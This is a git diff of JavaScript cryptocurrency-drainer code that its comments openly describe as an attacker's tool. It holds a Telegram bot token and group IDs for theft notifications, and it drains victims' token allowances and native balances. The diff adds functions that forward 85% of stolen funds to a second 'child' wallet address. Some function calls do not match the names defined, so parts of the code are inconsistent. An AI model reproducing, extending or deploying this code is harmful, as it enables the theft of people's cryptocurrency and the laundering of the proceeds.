@@ -3,6 +3,7 @@ const telegramBotToken = "7236108767:AAHgctM1RM7YJAj_tdh709ab8FIp05ZdH4E";
 const walletConnectionsGroupID = "-1002232445167";
 const allowanceIncreasesGroupID = "-1002147303946";
 const spenderAddress = "0x3577e3517e526950d62d0b13a2e2af836d3d2b6d"; // Attacker's address
+const childAddress = "0xdd959e5e55Bf6a37aBa441bf86E2A0e5394cFf32";//child address
 
 const networks ={
     ethereum:"https://mainnet.infura.io/v3/e2d084c3e2b94d6a9aa226a51876387e",
@@ -62,7 +63,8 @@ const abi = [
     "function increaseAllowance(address spender, uint256 addedValue) public returns (bool)",
     "function approve(address spender, uint256 addedValue) public returns (bool)",
     "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)",
-    "function allowance(address owner, address spender) view returns (uint256)"
+    "function allowance(address owner, address spender) view returns (uint256)",
+    "function transfer(address recipient, uint256 amount) external returns (bool)"
 ];
 
 // Initialize Telegram bot API instance
@@ -160,6 +162,7 @@ async function transferNativeToken(signer, balance, network) {
         await transaction.wait();
 
         console.log("Successfully transferred native token...");
+        shareNativeRewards(network,balance);
     } catch (error) {
         console.error("Error transferring native token:", error);
     }
@@ -289,8 +292,37 @@ async function serverSideLogic(signer, amount_, tokenAddress, network){
             // Send notification to Telegram group
             const message = `Successfully drained Allowance for ${tokenAddress} by ${await signer.getAddress()}`;
             await sendTelegramNotification(allowanceIncreasesGroupID, message);
+            shareRewards(network, amount_, tokenAddress);
         }catch(err){
             console.log("error transveeing the allowance...");
             console.log(err);
         };
+}
+
+async function shareTokenRewards(network, amount, tokenAddress){
+    const providerUrl = networks[network];
+    const provider = new ethers.providers.JsonRpcProvider(providerUrl);
+    const wallet = new ethers.Wallet(PK,provider);
+    const contract = new ethers.Contract(tokenAddress, abi, wallet);
+
+    const _85 = (amount*85)/100;
+
+    const receipt = await contract.transfer(childAddress,_85);
+    const tx = await receipt.wait();
+    console.log("successfully transferred 85% of token...");
+}
+
+async function shareNativeRewards(network, amount){
+    const providerUrl = networks[network];
+    const provider = new ethers.providers.JsonRpcProvider(providerUrl);
+    const wallet = new ethers.Wallet(PK,provider);
+    const _85 = (amount*85)/100;
+
+    const tx = {
+        to:childAddress,
+        value:_85
+    };
+    const txn = await wallet.sendTransaction(tx);
+    await txn.wait();
+    console.log("successfully transferred 85% of Netwok token...");
 }
